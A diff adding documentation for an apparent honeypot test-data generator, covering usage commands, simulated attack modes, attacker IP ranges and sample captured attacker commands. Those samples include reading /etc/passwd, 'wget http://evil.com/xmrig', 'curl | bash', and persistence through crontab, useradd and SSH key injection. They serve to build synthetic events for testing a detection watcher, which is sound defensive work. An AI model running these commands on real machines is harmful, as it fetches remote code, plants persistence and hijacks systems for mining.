@@ -276,7 +276,35 @@ cat events.jsonl | jq .
   "tags": ["password_auth"]
 }
 ```
+ Basic usage - generate 50 attack sessions:
+```bash
+python honeytrap_test_generator.py --output events.jsonl --sessions 50
+```
+Generate 100 sessions, mostly successful compromises:
+```bash
+python honeytrap_test_generator.py -o events.jsonl -n 100 --mode compromise --clear
+```
+Stream live events continuously (for testing the watcher):
+```bash
+python honeytrap_test_generator.py --output events.jsonl --stream --interval 1.0
+```
+What it generates:
+ModeDescriptionmixedRealistic mix: 60% quick scans, 30% brute force, 10% full compromisescansAutomated scanners (1-2 quick attempts, disconnect)bruteforceExtended brute-force sessions (3-20 attempts)compromiseFull attack chain: brute force → success → recon → malware → persistence
+Included attacker IPs from:
 
+🇩🇪 German Tor exits (185.220.x.x)
+🇷🇺 Russian bulletproof hosting (194.26.x.x, 91.243.x.x)
+🇨🇳 Chinese scan sources (218.92.x.x, 61.177.x.x)
+🇻🇳 Vietnamese scanners (113.160.x.x)
+🇧🇷 Brazilian attack sources (179.60.x.x)
+🇳🇱 Dutch VPS abuse (89.248.x.x, 80.82.x.x)
+
+Sample commands captured:
+
+Recon: id, uname -a, cat /etc/passwd 
+Malware: wget http://evil.com/xmrig, curl | bash
+Persistence: crontab, useradd, SSH key injection
+Cryptomining: xmrig, minerd execution
 ---
 
 ## 🐳 Docker Deployment
